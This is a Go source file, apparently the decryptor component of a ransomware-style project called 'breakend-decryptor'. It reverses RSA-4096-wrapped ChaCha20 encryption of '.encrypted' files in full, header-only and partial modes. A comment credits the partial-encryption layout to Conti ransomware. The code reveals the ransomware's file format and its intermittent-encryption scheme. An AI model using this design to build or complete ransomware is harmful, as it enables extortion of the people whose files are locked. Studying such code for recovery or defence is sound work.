package chacha20

import (
	"errors"
	"io"
	"os"
	"strconv"

	rsa4096 "breakend-decryptor/internal/rsa4096"

	"golang.org/x/crypto/chacha20"
	"golang.org/x/crypto/chacha20poly1305"
)

// Full file decryption functions using chacha20poly1305
func DecryptFileT1(filePath string, privRsaKeyBytes []byte) error {
	// Read the encrypted
	encryptedData, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// Check if the encryptedData is long enough to contain the key, nonce, and dataSize
	if len(encryptedData) < 512+chacha20poly1305.NonceSizeX+10 {
		return errors.New("encryptedData too short")
	}

	// Extract the dataSize
	dataSizeStr := encryptedData[len(encryptedData)-10:]
	encryptedData = encryptedData[:len(encryptedData)-10]
	dataSize, err := strconv.Atoi(string(dataSizeStr))
	if err != nil {
		return err
	}

	// Extraction of nonce and key
	keyNonce := encryptedData[len(encryptedData)-(512+chacha20poly1305.NonceSizeX):]
	encryptedData = encryptedData[:len(encryptedData)-(512+chacha20poly1305.NonceSizeX)]

	key := keyNonce[:512]
	// Decryption key from RSA
	key, err = rsa4096.DecryptWithRSA4096(key, privRsaKeyBytes)
	if err != nil {
		return err
	}

	nonce := keyNonce[512:]

	// Create a new Cipher
	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return err
	}

	// DEBUG
	// fmt.Printf("Key: %x\n", key)
	// fmt.Printf("Nonce: %x\n", nonce)
	// fmt.Printf("Data Size: %x\n", dataSize)

	// Decrypt the data
	plaintext, err := aead.Open(nil, nonce, encryptedData, nil)
	if err != nil {
		return err
	}

	// Check file integrity
	if len(plaintext) != dataSize {
		return errors.New("file integrity check failed")
	}

	// Overwrite the original file with the decrypted data
	originalFilePath := filePath[:len(filePath)-10]
	err = os.WriteFile(originalFilePath, plaintext, 0644)
	if err != nil {
		return err
	}

	// Remove the ".encrypted"
	err = os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}

// --------------------------------------------------------------------------------------------
// Header decryption functions using chacha20poly1305
func DecryptFileT2(filePath string, privRsaKeyBytes []byte) error {
	// Read file
	encryptedData, err := os.ReadFile(filePath)
	if err != nil {
		return err
	}

	// Extr dataSize
	dataSizeStr := encryptedData[len(encryptedData)-10:]
	encryptedData = encryptedData[:len(encryptedData)-10]
	dataSize, err := strconv.Atoi(string(dataSizeStr))
	if err != nil {
		return err
	}

	// Extract the nonce and key
	keyNonce := encryptedData[len(encryptedData)-(512+chacha20poly1305.NonceSizeX):]
	encryptedData = encryptedData[:len(encryptedData)-(512+chacha20poly1305.NonceSizeX)]

	key := keyNonce[:512]
	// Decryption key from RSA
	key, err = rsa4096.DecryptWithRSA4096(key, privRsaKeyBytes)
	if err != nil {
		return err
	}

	nonce := keyNonce[512:]

	// Create a new Cipher
	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return err
	}

	// After spending 3 hours reading about chacha20 the output from the algoritm adds 16 bytes this caused issues when decrypting the file
	// WHY IS THIS NOT ONE OF THE FIRST THINGS EXPLAINED!!!
	plaintext, err := aead.Open(nil, nonce, encryptedData[:1000016], nil)
	if err != nil {
		return err
	}

	// Append the rest of the original data
	plaintext = append(plaintext, encryptedData[1000016:]...)

	// Check file integrity
	if len(plaintext) != dataSize {
		return errors.New("file integrity check failed")
	}

	// Overwrite the original file with the decrypted data
	originalFilePath := filePath[:len(filePath)-10]
	err = os.WriteFile(originalFilePath, plaintext, 0644)
	if err != nil {
		return err
	}

	// Remove ".encrypted"
	err = os.Remove(filePath)
	if err != nil {
		return err
	}

	return nil
}

// --------------------------------------------------------------------------------------------
// Large file decryption functions using chacha20
func DecryptLargeFile(filePath string, dataPercent int, privRsaKeyBytes []byte) error {
	// Open file
	file, err := os.OpenFile(filePath, os.O_RDWR, 0)
	if err != nil {
		return err
	}
	defer file.Close()

	// Get file size
	fileInfo, err := file.Stat()
	if err != nil {
		return err
	}
	fileSize := fileInfo.Size()

	// Moves the file pointer to the position of the key and nonce
	if _, err := file.Seek(-int64(512+chacha20.NonceSize), io.SeekEnd); err != nil {
		return err
	}

	// Read key and nonce from the end of the file
	keyAndNonce := make([]byte, 512+chacha20.NonceSize)
	if _, err := file.Read(keyAndNonce); err != nil {
		return err
	}

	// Split the key and nonce
	key := keyAndNonce[:512]
	// Decryption key from RSA
	key, err = rsa4096.DecryptWithRSA4096(key, privRsaKeyBytes)
	if err != nil {
		return err
	}
	nonce := keyAndNonce[512:]

	// DEBUG
	//fmt.Printf("Key: %x\n", key)
	//fmt.Printf("Nonce: %x\n", nonce)

	// Calculate part size, step size, and steps count based on dataPercent
	// Conti Ransomware implementation
	var partSize, stepSize int64
	var stepsCount int
	switch dataPercent {
	case 20:
		partSize = (fileSize / 100) * 7
		stepsCount = 3
		stepSize = (fileSize - (partSize * 3)) / 2
	case 50:
		partSize = (fileSize / 100) * 10
		stepsCount = 5
		stepSize = partSize
	default:
		return errors.New("invalid dataPercent")
	}

	// new cipher instance
	c, err := chacha20.NewUnauthenticatedCipher(key, nonce)
	if err != nil {
		return err
	}

	// Move the file pointer back to the start
	if _, err := file.Seek(0, io.SeekStart); err != nil {
		return err
	}

	// Create a buffer to read data into
	buffer := make([]byte, 4096)

	// Decrypt the file partly
	// IT SOMEHOW WORKS MAGICALLY
	for i := 0; i < stepsCount; i++ {
		totalRead := int64(0)
		bytesToDecrypt := partSize

		if i != 0 {
			// Skip stepSize bytes
			if _, err := file.Seek(stepSize, io.SeekCurrent); err != nil {
				return err
			}
		}

		for totalRead < bytesToDecrypt {
			// Read data from the file
			bytesRead, err := file.Read(buffer)
			if err != nil && err != io.EOF {
				return err
			}
			//fmt.Printf("Bytes read: %d\n", bytesRead)
			if bytesRead == 0 {
				break
			}

			// Decrypt the data
			//fmt.Printf("Buffer: %x\n", buffer[:bytesRead])
			c.XORKeyStream(buffer[:bytesRead], buffer[:bytesRead])

			// Write the decrypted data back to the file
			if _, err := file.Seek(-int64(bytesRead), io.SeekCurrent); err != nil {
				return err
			}
			if _, err := file.Write(buffer[:bytesRead]); err != nil {
				return err
			}

			totalRead += int64(bytesRead)
		}
	}

	// Remove key and nonce
	if err := file.Truncate(fileSize - int64(512+chacha20.NonceSize)); err != nil {
		return err
	}

	file.Close()
	// remove .encrypted from file name
	originalFilePath := filePath[:len(filePath)-10]
	err = os.Rename(filePath, originalFilePath)
	if err != nil {
		return err
	}

	return nil
}
